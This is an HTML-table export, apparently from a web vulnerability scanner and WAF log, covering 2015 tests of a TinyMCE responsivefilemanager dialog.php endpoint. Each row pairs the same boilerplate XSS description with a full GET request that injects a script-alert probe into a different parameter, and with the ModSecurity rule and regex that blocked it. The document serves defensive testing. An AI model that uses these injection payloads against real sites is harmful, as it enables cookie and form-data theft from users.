&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(229399)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=jsvh11ftsd9cqjnkvoc621e8l2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:02</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:01 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(229399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRtsyawQAW0AAHewA9EAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsyawQAW0AAHewA9EAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366848</td><td class=xl24 width=64 >2015-03-31 20:38:48</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(246799)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=rau3bh4iid01023adrj91pueu0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:03</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:02 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(246799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRtsyqwQAW0AABvT@G0AAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsyqwQAW0AABvT@G0AAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366849</td><td class=xl24 width=64 >2015-03-31 20:40:32</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(603999)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=0oeeks7oujkgb3jtpf8jfip8k4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:04</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:03 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(603999)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRtsy6wQAW0AAD9hYN0AAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsy6wQAW0AAD9hYN0AAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366850</td><td class=xl24 width=64 >2015-03-31 20:42:16</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(911799)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=hed6nu6tjseibfpnncc1tnjeq5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:06</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:04 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(911799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRtszKwQAW0AAHhB77UAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtszKwQAW0AAHhB77UAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366851</td><td class=xl24 width=64 >2015-03-31 20:43:59</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(283399)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=jso8cdqfsnibf3je5mh4k47fe4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:07</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:06 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(283399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRtszqwQAW0AABt@bVwAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtszqwQAW0AABt@bVwAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366852</td><td class=xl24 width=64 >2015-03-31 20:44:20</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup='&gt;&lt;script&gt;alert(534599)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=5csjboihvh2v15rtdpa9lrvqb5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:08</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:07 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(534599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRtsz6wQAW0AAHchlVQAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsz6wQAW0AAHchlVQAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366853</td><td class=xl24 width=64 >2015-03-31 20:45:43</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(952099)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=3uafoa120ordij56remqg590d3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:09</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:08 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(952099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts0KwQAW0AAHgzv0YAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts0KwQAW0AAHgzv0YAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366854</td><td class=xl24 width=64 >2015-03-31 20:46:03</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(424599)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
